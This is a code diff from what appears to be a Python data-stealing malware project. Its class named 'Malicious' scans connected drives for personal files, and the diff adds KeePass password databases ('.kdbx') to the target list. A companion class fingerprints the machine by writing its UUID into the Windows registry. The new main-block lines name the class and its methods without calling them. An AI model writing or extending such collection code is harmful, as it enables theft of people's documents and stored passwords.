@@ -44,6 +44,7 @@ class Computer:
         except FileNotFoundError:
             self.create_registry_key(Key=subkey)
             uuid_key = self.open_registry_key(Key=subkey)
+        # This will reset the value every time. I need to do a try except block while trying to do a getvalue but I will do this later.
         uuid_value = uuid.getnode()
         self.set_registry_value(uuid_key, name, uuid_value)
 
@@ -83,7 +84,7 @@ class Malicious:
 
     def __init__(self) -> None:
         self.list_of_all_connected_drives = []
-        self.important_file_extensions = [".jpg", ".txt", ".docx", ".png"]
+        self.important_file_extensions = [".jpg", ".txt", ".docx", ".png", ".kdbx"]
         self.folders_to_exclude_in_data_collection = [r"c:\Windows\*", r"c:\Users\*\AppData\*", r"c:\Program Files\*", r"c:\Program Files (x86)\*", r"c:\ProgramData\*", \
             r"c:\Users\Public\*"]
         self.files_to_collect = []
@@ -123,5 +124,6 @@ class Malicious:
 
 obj = Logging()
 obj.create_working_enviroment()
-# obj = Computer()
-# obj.get_uuid()
+obj1 = Malicious
+obj1.find_all_connected_drives
+obj1.find_all_important_files
